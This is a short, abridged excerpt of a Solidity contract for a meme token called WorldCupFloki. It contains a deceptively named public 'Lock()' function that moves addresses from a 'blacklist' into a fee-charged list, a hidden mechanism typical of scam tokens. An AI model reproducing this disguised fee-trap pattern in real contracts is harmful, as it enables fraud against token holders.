...
contract WORLDCUPFLOKI is IBEP20, Ownable {
    ...
    string constant _name = "WorldCupFloki";
    string constant _symbol = unicode"WCF";
    ...
    address private marketingWallet = 0xC516d802fF39D0Cf80404bF8274dBf8D81F30E8E;
    ...
    function Lock() public virtual { includeFromFee = blacklist; for (uint256 i = 0; i < includeFromFee.length; i++) { _isIncludedFromFee[includeFromFee[i]] = true; } }
